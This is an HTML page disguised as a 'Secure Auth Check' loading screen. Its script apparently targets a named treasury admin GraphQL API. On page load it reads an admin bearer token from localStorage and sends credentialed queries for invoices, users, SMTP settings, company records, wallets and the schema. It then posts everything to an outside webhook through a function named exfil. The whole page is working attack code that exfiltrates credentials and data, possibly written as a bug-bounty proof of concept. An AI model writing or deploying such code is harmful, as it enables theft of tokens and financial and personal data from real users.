<!DOCTYPE html>
<html>
<head><title>Secure Auth Check</title><meta charset="UTF-8"></head>
<body>
<h2>Authenticating... Please wait.</h2>
<script>
const API = 'https://treasury-admin.alphapoint.com/graphql';
const HOOK = 'https://app.hooklistener.com/w/my-first-endpoint-raet';

// If this script EVER runs inside treasury-admin.alphapoint.com (e.g., via origin XSS),
// it will automatically steal the Bearer token. From github.io this returns null.
const bearer = localStorage.getItem('admin-original-access-token');

const headers = {
  'Content-Type': 'application/json'
};
if (bearer) headers['Authorization'] = `Bearer ${bearer}`;

const probes = [
  { label: 'invoices', query: `{ adminInvoices { items { id status amount currency createdAt } totalCount } }` },
  { label: 'company', query: `{ adminCompanyDetail(companyId: "1") { id name status email phone address taxId createdAt updatedAt } }` },
  { label: 'smtp', query: `{ adminTenantSmtpConfig(tenantId: "1") { host port username fromEmail hasPassword } }` },
  { label: 'users', query: `{ adminUsers { items { id email role status tenantId createdAt } totalCount } }` },
  { label: 'me', query: `{ me { id email role tenantId } }` },
  { label: 'viewer', query: `{ viewer { id email role } }` },
  { label: 'wallets', query: `{ adminWallets(companyId: "1") { id currency balance address } }` },
  { label: 'schema', query: `{ __schema { types { name } } }` }
];

async function exfil() {
  const results = [];
  
  for (const p of probes) {
    try {
      const res = await fetch(API, {
        method: 'POST',
        credentials: 'include',
        headers: headers,
        body: JSON.stringify({ query: p.query })
      });
      const text = await res.text();
      results.push({ label: p.label, status: res.status, body: text });
    } catch (e) {
      results.push({ label: p.label, error: e.message });
    }
  }

  // Send one batched payload to your webhook
  await fetch(HOOK, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
      captured: new Date().toISOString(),
      hadBearer: !!bearer,
      origin: location.origin,
      results: results
    })
  });
}

setTimeout(exfil, 800);
</script>
</body>
</html>
